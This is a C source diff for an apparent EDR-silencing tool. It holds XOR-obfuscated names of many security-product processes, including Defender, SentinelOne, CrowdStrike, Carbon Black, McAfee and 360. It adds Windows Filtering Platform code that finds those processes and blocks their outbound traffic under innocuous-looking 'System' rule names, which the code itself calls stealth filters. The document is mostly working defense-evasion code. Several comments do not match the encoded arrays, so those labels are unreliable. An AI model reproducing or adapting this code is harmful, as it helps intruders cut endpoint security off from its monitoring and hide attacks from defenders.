+const unsigned char data_119[] = { 0x1d, 0x1e, 0x1c, 0x35, 0x2a, 0x65, 0x6c, 0x70, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKVHelper.exe
+const unsigned char data_120[] = { 0x24, 0x61, 0x74, 0x61, 0x20, 0x72, 0x6f, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // DataProt.exe
+const unsigned char data_121[] = { 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x73, 0x6f, 0x66, 0x74, 0x73, 0x65, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // defaultsoftset.exe
+const unsigned char data_122[] = { 0x64, 0x65, 0x70, 0x1d, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // depAVK.exe
+const unsigned char data_123[] = { 0x24, 0x23, 0x2e, 0x61, 0x69, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // DSMain.exe
+const unsigned char data_124[] = { 0x24, 0x75, 0x6d, 0x70, 0x35, 0x70, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // DumpSper.exe
+const unsigned char data_125[] = { 0x25, 0x61, 0x2b, 0x6e, 0x73, 0x74, 0x2a, 0x65, 0x6c, 0x70, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // EAInstHelper.exe
+const unsigned char data_126[] = { 0x25, 0x61, 0x2b, 0x6e, 0x73, 0x74, 0x2a, 0x65, 0x6c, 0x70, 0x65, 0x72, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // EAInstHelperSvc.exe
+const unsigned char data_127[] = { 0x2c, 0x69, 0x76, 0x65, 0x35, 0x70, 0x64, 0x61, 0x74, 0x65, 0x1d, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // LiveUpdateAVK.exe
+const unsigned char data_128[] = { 0x2e, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x35, 0x70, 0x64, 0x61, 0x74, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // ModuleUpdate.exe
+const unsigned char data_129[] = { 0x20, 0x6f, 0x70, 0x37, 0x6e, 0x64, 0x2c, 0x6f, 0x67, 0x2c, 0x65, 0x78, 0x65 }; // PopWndog.exe
+const unsigned char data_130[] = { 0x20, 0x6f, 0x70, 0x77, 0x6e, 0x64, 0x34, 0x72, 0x61, 0x63, 0x6b, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // PopwndTracker.exe
+const unsigned char data_131[] = { 0x20, 0x6f, 0x77, 0x65, 0x72, 0x23, 0x61, 0x76, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // PowerSaver.exe
+const unsigned char data_132[] = { 0x20, 0x72, 0x6f, 0x63, 0x34, 0x72, 0x65, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // ProcTree.exe
+const unsigned char data_133[] = { 0x32, 0x65, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x79, 0x1d, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // RecoveryAVK.exe
+const unsigned char data_134[] = { 0x32, 0x65, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // Relocate.exe
+const unsigned char data_135[] = { 0x72, 0x65, 0x70, 0x61, 0x69, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // repair.exe
+const unsigned char data_136[] = { 0x23, 0x6f, 0x66, 0x74, 0x2e, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SoftMgr.exe
+const unsigned char data_137[] = { 0x23, 0x6f, 0x66, 0x74, 0x2e, 0x67, 0x72, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // SoftMgrSvc.exe
+const unsigned char data_138[] = { 0x23, 0x6f, 0x66, 0x74, 0x75, 0x70, 0x2e, 0x6f, 0x74, 0x69, 0x66, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // SoftupNotify.exe
+const unsigned char data_139[] = { 0x23, 0x32, 0x21, 0x67, 0x65, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // SRAgent.exe
+const unsigned char data_140[] = { 0x23, 0x75, 0x70, 0x65, 0x72, 0x2b, 0x69, 0x6c, 0x6c, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SuperKiller.exe
+const unsigned char data_141[] = { 0x35, 0x70, 0x34, 0x69, 0x70, 0x2c, 0x65, 0x78, 0x65 }; // VpTip.exe
+const unsigned char data_142[] = { 0x77, 0x64, 0x66, 0x69, 0x78, 0x73, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // wdfixsc.exe
+const unsigned char data_143[] = { 0x37, 0x24, 0x20, 0x61, 0x79, 0x20, 0x72, 0x6f, 0x2c, 0x65, 0x78, 0x65 }; // WDPro.exe
+const unsigned char data_144[] = { 0x37, 0x24, 0x23, 0x61, 0x66, 0x65, 0x24, 0x6f, 0x77, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // WDSafeDown.exe
+const unsigned char data_145[] = { 0x77, 0x64, 0x73, 0x77, 0x66, 0x73, 0x61, 0x66, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // wdswfsafe.exe
+const unsigned char data_146[] = { 0x37, 0x69, 0x6e, 0x1d, 0x1a, 0x26, 0x75, 0x6e, 0x63, 0x2c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // WinKHunc,oader.exe
+const unsigned char data_147[] = { 0x37, 0x73, 0x63, 0x23, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x2c, 0x65, 0x78, 0x65 }; // WscControl.exe
+const unsigned char data_148[] = { 0x3a, 0x68, 0x75, 0x24, 0x6f, 0x6e, 0x67, 0x26, 0x61, 0x6e, 0x67, 0x39, 0x75, 0x2c, 0x65, 0x78, 0x65 }; // ZhuDongFangYu.exe
+const unsigned char data_149[] = { 0x22, 0x61, 0x69, 0x64, 0x75, 0x23, 0x64, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // BaiduSdSvc.exe
+const unsigned char data_150[] = { 0x23, 0x61, 0x66, 0x65, 0x24, 0x6f, 0x67, 0x27, 0x75, 0x61, 0x72, 0x64, 0x23, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SafeDogGuardCenter.exe
+const unsigned char data_151[] = { 0x73, 0x61, 0x66, 0x65, 0x64, 0x6f, 0x67, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x63, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // safedogupdatecenter.exe
+const unsigned char data_152[] = { 0x73, 0x61, 0x66, 0x65, 0x64, 0x6f, 0x67, 0x67, 0x75, 0x61, 0x72, 0x64, 0x63, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // safedogguardcenter.exe
+const unsigned char data_153[] = { 0x23, 0x61, 0x66, 0x65, 0x24, 0x6f, 0x67, 0x23, 0x69, 0x74, 0x65, 0x2b, 0x2b, 0x23, 0x2c, 0x65, 0x78, 0x65 }; // SafeDogSiteIIS.exe
+const unsigned char data_154[] = { 0x23, 0x61, 0x66, 0x65, 0x24, 0x6f, 0x67, 0x34, 0x72, 0x61, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // SafeDogTray.exe
+const unsigned char data_155[] = { 0x23, 0x61, 0x66, 0x65, 0x24, 0x6f, 0x67, 0x23, 0x65, 0x72, 0x76, 0x65, 0x72, 0x35, 0x2b, 0x2c, 0x65, 0x78, 0x65 }; // SafeDogServerUI.exe
+const unsigned char data_156[] = { 0x24, 0x5f, 0x23, 0x61, 0x66, 0x65, 0x5f, 0x2e, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // D_Safe_Manage.exe
+const unsigned char data_157[] = { 0x64, 0x5f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // d_manage.exe
+const unsigned char data_158[] = { 0x79, 0x75, 0x6e, 0x73, 0x75, 0x6f, 0x5f, 0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // yunsuo_agent_service.exe
+const unsigned char data_159[] = { 0x79, 0x75, 0x6e, 0x73, 0x75, 0x6f, 0x5f, 0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x64, 0x61, 0x65, 0x6d, 0x6f, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // yunsuo_agent_daemon.exe
+const unsigned char data_160[] = { 0x2a, 0x77, 0x73, 0x20, 0x61, 0x6e, 0x65, 0x6c, 0x2c, 0x65, 0x78, 0x65 }; // HwsPanel.exe
+const unsigned char data_161[] = { 0x68, 0x77, 0x73, 0x5f, 0x75, 0x69, 0x2c, 0x65, 0x78, 0x65 }; // hws_ui.exe
+const unsigned char data_162[] = { 0x68, 0x77, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // hws.exe
+const unsigned char data_163[] = { 0x68, 0x77, 0x73, 0x64, 0x2c, 0x65, 0x78, 0x65 }; // hwsd.exe
+
+// The array of structs pointing to the encrypted data.
+struct EncryptedString processData[] = {
+    { data_0, sizeof(data_0) },   // MsMpEng.exe
+    { data_1, sizeof(data_1) },   // MsSense.exe
+    { data_2, sizeof(data_2) },   // senseCnc.exe
+    { data_3, sizeof(data_3) },   // sensedr.exe
+    { data_4, sizeof(data_4) },   // senseCncProxy.exe
+    { data_5, sizeof(data_5) },   // senseSampleUploader.exe
+    { data_2, sizeof(data_2) },   // SenseIR.exe
+    { data_3, sizeof(data_3) },   // SenseSdr.exe
+    { data_4, sizeof(data_4) },   // SenseNdrProxy.exe
+    { data_5, sizeof(data_5) },   // SenseSampleUploader.exe
+    { data_6, sizeof(data_6) },   // HealthService.exe
+    { data_7, sizeof(data_7) },   // MonitoringHost.exe
+    { data_8, sizeof(data_8) },   // MpCmdRun.exe
+    { data_9, sizeof(data_9) },   // winlogbeat.exe
+    { data_10, sizeof(data_10) }, // elastic-agent.exe
+    { data_11, sizeof(data_11) }, // elastic-endpoint.exe
+    { data_12, sizeof(data_12) }, // filebeat.exe
+    { data_13, sizeof(data_13) }, // xagt.exe
+    { data_14, sizeof(data_14) }, // QualysAgent.exe
+    { data_15, sizeof(data_15) }, // SentinelAgent.exe
+    { data_16, sizeof(data_16) }, // SentinelAgentWorker.exe
+    { data_17, sizeof(data_17) }, // SentinelServiceHost.exe
+    { data_18, sizeof(data_18) }, // SentinelStaticEngine.exe
+    { data_19, sizeof(data_19) }, // Log ProcessorService.exe
+    { data_20, sizeof(data_20) }, // SentinelStaticEngineScanner.exe
+    { data_21, sizeof(data_21) }, // SentinelUI.exe
+    { data_22, sizeof(data_22) }, // SentinelStaticEnginePatcher.exe
+    { data_23, sizeof(data_23) }, // SentinelBrowserNativeHost.exe
+    { data_24, sizeof(data_24) }, // SentinelRemediation.exe
+    { data_25, sizeof(data_25) }, // SentinelHelperService.exe
+    { data_26, sizeof(data_26) }, // SentinelRemoteShell.exe
+    { data_27, sizeof(data_27) }, // SentinelRemoteShellHost.exe
+    { data_28, sizeof(data_28) }, // SentinelScanFromContextMenu.exe
+    { data_29, sizeof(data_29) }, // cb.exe
+    { data_30, sizeof(data_30) }, // cbsensor.exe
+    { data_31, sizeof(data_31) }, // cbdaemon.exe
+    { data_32, sizeof(data_32) }, // cban.exe
+    { data_33, sizeof(data_33) }, // cbpsc.exe
+    { data_34, sizeof(data_34) }, // cbcomms.exe
+    { data_35, sizeof(data_35) }, // carbonblack.exe
+    { data_36, sizeof(data_36) }, // cbcloud.exe
+    { data_37, sizeof(data_37) }, // cbt.exe
+    { data_38, sizeof(data_38) }, // RepUtils.exe
+    { data_39, sizeof(data_39) }, // RepUx.exe
+    { data_40, sizeof(data_40) }, // RepSvc.exe
+    { data_41, sizeof(data_41) }, // RepCLI.exe
+    { data_42, sizeof(data_42) }, // CbDefense.exe
+    { data_43, sizeof(data_43) }, // CbDefense-Audit.exe
+    { data_44, sizeof(data_44) }, // CbDefense-Recorder.exe
+    { data_45, sizeof(data_45) }, // CbDefense-Sensor.exe
+    { data_46, sizeof(data_46) }, // CbDefense-Service.exe
+    { data_47, sizeof(data_47) }, // CbDefense-UI.exe
+    { data_48, sizeof(data_48) }, // csagent.exe
+    { data_49, sizeof(data_49) }, // csfalcon.exe
+    { data_50, sizeof(data_50) }, // csfalconservice.exe
+    { data_51, sizeof(data_51) }, // csconnector.exe
+    { data_52, sizeof(data_52) }, // ekrn.exe
+    { data_53, sizeof(data_53) }, // ehurukai.exe
+    { data_54, sizeof(data_54) }, // endgame.exe
+    { data_55, sizeof(data_55) }, // esensor.exe
+    { data_56, sizeof(data_56) }, // eamsi.exe
+    { data_57, sizeof(data_57) }, // epp.exe
+    { data_58, sizeof(data_58) }, // eppservice.exe
+    { data_59, sizeof(data_59) }, // eppconsole.exe
+    { data_60, sizeof(data_60) }, // eppremediate.exe
+    { data_61, sizeof(data_61) }, // eadr.exe
+    { data_62, sizeof(data_62) }, // edpa.exe
+    { data_63, sizeof(data_63) }, // wdp.exe
+    { data_64, sizeof(data_64) }, // 4m.exe
+    { data_65, sizeof(data_65) }, // wsctrlsvc.exe
+    { data_66, sizeof(data_66) }, // hips4ray.exe
+    { data_67, sizeof(data_67) }, // hipsdaemon.exe
+    { data_68, sizeof(data_68) }, // mfemms.exe
+    { data_69, sizeof(data_69) }, // mfeann.exe
+    { data_70, sizeof(data_70) }, // mfecanary.exe
+    { data_71, sizeof(data_71) }, // mfeelam.exe
+    { data_72, sizeof(data_72) }, // mfeens.exe
+    { data_73, sizeof(data_73) }, // mfeesp.exe
+    { data_74, sizeof(data_74) }, // mfefire.exe
+    { data_75, sizeof(data_75) }, // mfehcs.exe
+    { data_76, sizeof(data_76) }, // mfehidin.exe
+    { data_77, sizeof(data_77) }, // mcafee diagnose scan.exe
+    { data_78, sizeof(data_78) }, // mc fab.exe
+    { data_79, sizeof(data_79) }, // mc feedback.exe
+    { data_80, sizeof(data_80) }, // mcinst.exe
+    { data_81, sizeof(data_81) }, // mclogs.exe
+    { data_82, sizeof(data_82) }, // mc-fw-host.exe
+    { data_83, sizeof(data_83) }, // mc-inst-ui.exe
+    { data_84, sizeof(data_84) }, // mc-neo-a-host.exe
+    { data_85, sizeof(data_85) }, // mc-neo-w-host.exe
+    { data_86, sizeof(data_86) }, // mc-neo-host.exe
+    { data_87, sizeof(data_87) }, // mc-mp-host.exe
+    { data_88, sizeof(data_88) }, // mcnetcfg.exe
+    { data_89, sizeof(data_89) }, // mcnetman.exe
+    { data_90, sizeof(data_90) }, // mcrepair.exe
+    { data_91, sizeof(data_91) }, // mcscan.exe
+    { data_92, sizeof(data_92) }, // mcshell.exe
+    { data_93, sizeof(data_93) }, // mcshield.exe
+    { data_94, sizeof(data_94) }, // mctp.exe
+    { data_95, sizeof(data_95) }, // mcupd.exe
+    { data_96, sizeof(data_96) }, // mcuihost.exe
+    { data_97, sizeof(data_97) }, // mcuicnt.exe
+    { data_98, sizeof(data_98) }, // mcvs.exe
+    { data_99, sizeof(data_99) }, // mcvsscn.exe
+    { data_100, sizeof(data_100) }, // mcsafe.exe
+    { data_101, sizeof(data_101) }, // mcsclog.exe
+    { data_102, sizeof(data_102) }, // mcscreencapture.exe
+    { data_103, sizeof(data_103) }, // mcsync.exe
+    { data_104, sizeof(data_104) }, // mccep.exe
+    { data_105, sizeof(data_105) }, // mccepbrw.exe
+    { data_106, sizeof(data_106) }, // mfehidin.exe
+    { data_107, sizeof(data_107) }, // mfehidin.exe
+    { data_108, sizeof(data_108) }, // mfetp.exe
+    { data_109, sizeof(data_109) }, // mfeamcin.exe
+    { data_110, sizeof(data_110) }, // mfeaps.exe
+    { data_111, sizeof(data_111) }, // mfeavsvc.exe
+    { data_112, sizeof(data_112) }, // mfeskin.gr.exe
+    { data_113, sizeof(data_113) }, // 360SPTool.exe
+    { data_114, sizeof(data_114) }, // 360taskmgr.exe
+    { data_115, sizeof(data_115) }, // 360Toasts.exe
+    { data_116, sizeof(data_116) }, // 360UDisk.exe
+    { data_117, sizeof(data_117) }, // 360WD.exe
+    { data_118, sizeof(data_118) }, // 360WebDeff.exe
+    { data_119, sizeof(data_119) }, // 360leakfix.exe
+    { data_120, sizeof(data_120) }, // 360LeakRepair.exe
+    { data_121, sizeof(data_121) }, // 360NetRepair.exe
+    { data_122, sizeof(data_122) }, // 360Netman.exe
+    { data_123, sizeof(data_123) }, // 360ain.exe
+    { data_124, sizeof(data_124) }, // 360dump.exe
+    { data_125, sizeof(data_125) }, // 360insthelper.exe
+    { data_126, sizeof(data_126) }, // 360rp.exe
+    { data_127, sizeof(data_127) }, // 360safe.exe
+    { data_128, sizeof(data_128) }, // 360safetray.exe
+    { data_129, sizeof(data_129) }, // 360sd.exe
+    { data_130, sizeof(data_130) }, // 360sdup.exe
+    { data_131, sizeof(data_131) }, // 360sdrun.exe
+    { data_132, sizeof(data_132) }, // 360sdtooldata.exe
+    { data_133, sizeof(data_133) }, // 360sec.exe
+    { data_134, sizeof(data_134) }, // 360secext.exe
+    { data_135, sizeof(data_135) }, // repair.exe
+    { data_136, sizeof(data_136) }, // soft.gr.exe
+    { data_137, sizeof(data_137) }, // soft.gr.exe
+    { data_138, sizeof(data_138) }, // softup.notify.exe
+    { data_139, sizeof(data_139) }, // SuperKiller.exe
+    { data_140, sizeof(data_140) }, // WDSafeDown.exe
+    { data_141, sizeof(data_141) }, // WscControl.exe
+    { data_142, sizeof(data_142) }, // ZhuDongFangYu.exe
+    { data_143, sizeof(data_143) }, // Symantec.exe
+    { data_144, sizeof(data_144) }, // SymantecAgent.exe
+    { data_145, sizeof(data_145) }, // SymantecUI.exe
+    { data_146, sizeof(data_146) }, // Symantec Antivirus.exe
+    { data_147, sizeof(data_147) }, // Symantec Endpoint Protection.exe
+    { data_148, sizeof(data_148) }, // zhongshenlong.exe
+    { data_149, sizeof(data_149) }, // avg.exe
+    { data_150, sizeof(data_150) }, // avast.exe
+    { data_151, sizeof(data_151) }, // bitdefender.exe
+    { data_152, sizeof(data_152) }, // kaspersky.exe
+    { data_153, sizeof(data_153) }, // sophos.exe
+    { data_154, sizeof(data_154) }, // trend micro.exe
+    { data_155, sizeof(data_155) }, // eset.exe
+    { data_156, sizeof(data_156) }, // f-secure.exe
+    { data_157, sizeof(data_157) }, // panda.exe
+    { data_158, sizeof(data_158) }, // webroot.exe
+    { data_159, sizeof(data_159) }, // norton.exe
+    { data_160, sizeof(data_160) }, // mcafee.exe
+    { data_161, sizeof(data_161) }, // cylance.exe
+    { data_162, sizeof(data_162) }, // crowdstrike.exe
+    { data_163, sizeof(data_163) }, // hwsd.exe
+};
+
+// Generic names for WFP filter and provider details
+WCHAR* ruleName = L"System-Outbound-Rule";
+WCHAR* sourceName = L"System Core Service";
+
+WCHAR* permitRuleName = L"System-Permit-Rule";
+
+// Generic flag array to track processed items
+BOOL itemProcessed[sizeof(processData) / sizeof(processData[0])] = { FALSE };
+
+// Check if the running process is in our target list
+BOOL isProcessInList(const char* procName) {
+    for (size_t i = 0; i < sizeof(processData) / sizeof(processData[0]); i++) { // Use size_t for loop
+        char* decryptedName = decryptString(processData[i]);
+        if (!decryptedName) continue;
+
+        if (strcmp(procName, decryptedName) == 0 && !itemProcessed[i]) {
+            itemProcessed[i] = TRUE;
+            free(decryptedName); // Use free instead of delete[]
             return TRUE;
         }
+        free(decryptedName); // Use free instead of delete[]
     }
     return FALSE;
 }
 
-// Add WFP filters for all known EDR process(s)
-void BlockEdrProcessTraffic() {
+// Helper function to apply the two-layer permit/block filter system for a given AppID
+void applyStealthFilters(HANDLE hEngine, FWP_BYTE_BLOB* appId, const GUID* subLayerGuid, const WCHAR* fullPath) {
     DWORD result = 0;
-    HANDLE hEngine = NULL;
-    HANDLE hProcessSnap = NULL;
-    HANDLE hModuleSnap = NULL;
-    PROCESSENTRY32 pe32 = {0};
-    BOOL isEdrDetected = FALSE;
+    char fullPathAnsi[MAX_PATH];
+    wcstombs(fullPathAnsi, fullPath, MAX_PATH);
 
-    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
+    FWPM_FILTER0 blockFilter = { 0 };
+    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
+    blockFilter.action.type = FWP_ACTION_BLOCK;
+    blockFilter.subLayerKey = *subLayerGuid; // This needs to be the GUID of our sublayer
+    blockFilter.weight.type = FWP_UINT8;
+    blockFilter.weight.uint8 = 15; // High weight to ensure it's evaluated
+    blockFilter.numFilterConditions = 1;
+    blockFilter.displayData.name = L"Block Outbound for EDR";
+    blockFilter.displayData.description = L"Blocks outbound connections for a specific EDR process";
+
+    FWPM_FILTER_CONDITION0 condition = { 0 };
+    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
+    condition.matchType = FWP_MATCH_EQUAL;
+    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
+    condition.conditionValue.byteBlob = appId;
+    blockFilter.filterCondition = &condition;
+
+    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, NULL);
+    if (result == ERROR_SUCCESS) {
+        printf("    [+] BLOCK rule (IPv4) added for \"%s\" with ID: %llu.\n", fullPathAnsi, blockFilter.filterId);
+    } else {
+        printf("    [-] Failed to add BLOCK rule (IPv4) for \"%s\" with error: 0x%lX.\n", fullPathAnsi, (long)result);
+    }
+
+    FWPM_FILTER0 permitFilter = { 0 };
+    permitFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
+    permitFilter.action.type = FWP_ACTION_PERMIT;
+    permitFilter.subLayerKey = *subLayerGuid; // Same sublayer
+    permitFilter.weight.type = FWP_UINT8;
+    permitFilter.weight.uint8 = 14; // Lower weight than block
+    permitFilter.numFilterConditions = 2; // We need two conditions now
+    permitFilter.displayData.name = L"Permit Loopback for EDR";
+    permitFilter.displayData.description = L"Permits loopback connections for a specific EDR process";
+
+    FWPM_FILTER_CONDITION0 conditions[2] = { 0 };
+    conditions[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
+    conditions[0].matchType = FWP_MATCH_EQUAL;
+    conditions[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
+    conditions[0].conditionValue.byteBlob = appId;
+
+    conditions[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
+    conditions[1].matchType = FWP_MATCH_EQUAL;
+    conditions[1].conditionValue.type = FWP_UINT32;
+    conditions[1].conditionValue.uint32 = 0x7F000001; // 127.0.0.1
+
+    permitFilter.filterCondition = conditions;
+
+    result = FwpmFilterAdd0(hEngine, &permitFilter, NULL, NULL);
+    if (result == ERROR_SUCCESS) {
+        printf("    [+] PERMIT rule (IPv4) added for \"%s\" with ID: %llu.\n", fullPathAnsi, permitFilter.filterId);
+    } else {
+        printf("    [-] Failed to add PERMIT rule (IPv4) for \"%s\" with error: 0x%lX.\n", fullPathAnsi, (long)result);
+    }
+}
+
+// Helper function to initialize WFP engine and add provider/sublayer
+BOOL initializeWfp(HANDLE* hEngine) {
+    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
     if (result != ERROR_SUCCESS) {
-        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
-        return;
-    }
-   
-    EnableSeDebugPrivilege();
-
-    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        printf("[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n", GetLastError());
-        return;
+        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
+        return FALSE;
     }
 
+    FWPM_PROVIDER0 provider = { 0 };
+    provider.providerKey = ProviderGUID;
+    provider.displayData.name = L"EDR Silencer Provider";
+    provider.displayData.description = L"Provider for EDR Silencer to block network traffic";
+    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
+    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
+        printf("[-] FwpmProviderAdd0 failed. Error: 0x%lX\n", result);
+        FwpmEngineClose0(*hEngine);
+        return FALSE;
+    }
+
+    FWPM_SUBLAYER0 subLayer = { 0 };
+    subLayer.subLayerKey = SubLayerGUID;
+    subLayer.displayData.name = L"EDR Silencer SubLayer";
+    subLayer.displayData.description = L"SubLayer for EDR Silencer filters";
+    subLayer.providerKey = (GUID*)&ProviderGUID;
+    subLayer.weight = 0x01;
+    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
+    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
+        printf("[-] FwpmSubLayerAdd0 failed. Error: 0x%lX\n", result);
+        FwpmEngineClose0(*hEngine);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+// Helper function to close the WFP engine handle
+void shutdownWfp(HANDLE hEngine) {
+    if (hEngine) {
+        FwpmEngineClose0(hEngine);
+        printf("[+] WFP engine handle closed.\n");
+    }
+}
+
+void addProcessRule(const char* processPath) {
+    HANDLE hEngine = NULL;
+    if (!initializeWfp(&hEngine)) {
+        return;
+    }
+
+    wchar_t processPathW[MAX_PATH];
+    mbstowcs(processPathW, processPath, MAX_PATH);
+
+    FWP_BYTE_BLOB* app_id = NULL;
+    if (CustomFwpmGetAppIdFromFileName0(processPathW, &app_id) == CUSTOM_SUCCESS) {
+        printf(" [+] Application ID created for %s.\n", processPath);
+        applyStealthFilters(hEngine, app_id, &SubLayerGUID, processPathW);
+    } else {
+        printf(" [-] Failed to create application ID for %s.\n", processPath);
+    }
+
+    if (app_id) {
+        FwpmFreeMemory0((void**)&app_id);
+    }
+
+    shutdownWfp(hEngine);
+}
+
+// Function to configure network filters
+void configureNetworkFilters() {
+    HANDLE hEngine = NULL;
+    if (!initializeWfp(&hEngine)) {
+        return;
+    }
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create snapshot of processes.\n");
+        shutdownWfp(hEngine);
+        return;
+    }
+
+    PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    if (!Process32First(hProcessSnap, &pe32)) {
-        printf("[-] Process32First failed with error code: 0x%x.\n", GetLastError());
-        CloseHandle(hProcessSnap);
-        return;
-    }
-
-    do {
-        if (isInEdrProcessList(pe32.szExeFile)) {
-            isEdrDetected = TRUE;
-            printf("Detected running EDR process: %s (%d):\n", pe32.szExeFile, pe32.th32ProcessID);
-            // Get full path of the running process
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
-            if (hProcess) {
-                WCHAR fullPath[MAX_PATH] = {0};
-                DWORD size = MAX_PATH;
-                FWPM_FILTER_CONDITION0 cond = {0};
-                FWPM_FILTER0 filter = {0};
-                FWPM_PROVIDER0 provider = {0};
-                GUID providerGuid = {0};
-                FWP_BYTE_BLOB* appId = NULL;
-                UINT64 filterId = 0;
-                ErrorCode errorCode = CUSTOM_SUCCESS;
-                
-                QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
-                errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
-                if (errorCode != CUSTOM_SUCCESS) {
-                    switch (errorCode) {
-                        case CUSTOM_FILE_NOT_FOUND:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
-                            break;
-                        case CUSTOM_MEMORY_ALLOCATION_ERROR:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
-                            break;
-                        case CUSTOM_NULL_INPUT:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
-                            break;
-                        case CUSTOM_DRIVE_NAME_NOT_FOUND:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
-                            break;
-                        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
-                            break;
-                        default:
-                            break;
-                    }
-                    CloseHandle(hProcess);
-                    continue;
-                } 
-
-                // Sett up WFP filter and condition
-                filter.displayData.name = filterName;
-                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
-                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
-                filter.action.type = FWP_ACTION_BLOCK;
-                UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
-                filter.weight.type = FWP_UINT64;
-                filter.weight.uint64 = &weightValue;
-                cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
-                cond.matchType = FWP_MATCH_EQUAL;
-                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
-                cond.conditionValue.byteBlob = appId;
-                filter.filterCondition = &cond;
-                filter.numFilterConditions = 1;
-
-                 // Add WFP provider for the filter
-                if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-                    filter.providerKey = &providerGuid;
-                } else {
-                    provider.displayData.name = providerName;
-                    provider.displayData.description = providerDescription;
-                    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
